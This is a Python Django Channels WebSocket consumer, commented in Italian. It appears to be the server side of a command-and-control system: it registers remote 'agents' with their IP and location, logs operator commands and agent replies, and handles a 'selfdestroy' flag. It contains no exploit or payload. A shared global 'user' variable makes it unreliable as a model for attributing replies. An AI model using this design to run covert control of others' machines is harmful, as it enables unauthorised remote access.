#consumers.py
import json
from library.models import Device, Message, User
from asgiref.sync import sync_to_async
from channels.generic.websocket import AsyncWebsocketConsumer


user = ''

class ChatConsumer(AsyncWebsocketConsumer):

    
                
    async def connect(self):
        # Esegui le operazioni necessarie quando una connessione WebSocket viene stabilita
        self.device_id = self.scope['url_route']['kwargs']['device_id']
        self.room_group_name = f"chat_{self.device_id}"
        await self.channel_layer.group_add(self.room_group_name, self.channel_name)

        #print(self.device_id)
        # Join room group
        print("accept")
        await self.accept()
        
        #print(subprocess.getoutput('ps'))

        #await heartbeat() #funzione utile a controllare se il server è presente nella chatroom

    async def disconnect(self, close_code):
        # Leave room group
        await self.channel_layer.group_discard(self.room_group_name, self.channel_name)

    async def receive(self, text_data):
        global user 
        
        text_data_json = json.loads(text_data)
        message = text_data_json["message"]
        sender = text_data_json.get("sender", '')
        agent_info = text_data_json.get('agent_info', '')
        selfdestruct = text_data_json.get("selfdestroy", '')
        #print("package", text_data_json)
        #print(user)
        #print("sender",sender)

        
        #print("selfd", selfdestruct)
        if selfdestruct == True:
            await sync_to_async(Device.objects.filter(username=text_data_json["agent"]).update)(status=False)
            print("destroyed")


            
        if agent_info != '':
            try:
                await sync_to_async(Device.objects.get_or_create)(username=agent_info["username"], 
                                                defaults={"ip": agent_info["ip"], "agent_location": agent_info["agent_location"], "status":True})
            except Exception as e: 
                print(e)
                await self.close()

        else:
            if sender == "":#reply                
                await sync_to_async(Message.objects.create)(user_id=user, device_id=text_data_json["agent"], payload=message, type="R")

            else:#command
                user = self.scope.get('user', '')
                await sync_to_async(Message.objects.create)(user_id=user, device_id=text_data_json["sender"], payload=message, type="C")
        
         # Send message to room group
        await self.channel_layer.group_send(
            self.room_group_name, {"type": "chat.message", "message": message, "sender": sender})
        
        # Receive message from room group
    async def chat_message(self, event):
        message = event["message"]
        ##
        sender = event["sender"]
        # Send message to WebSocket
        await self.send(text_data=json.dumps({"message": message, "sender":sender}))
        
        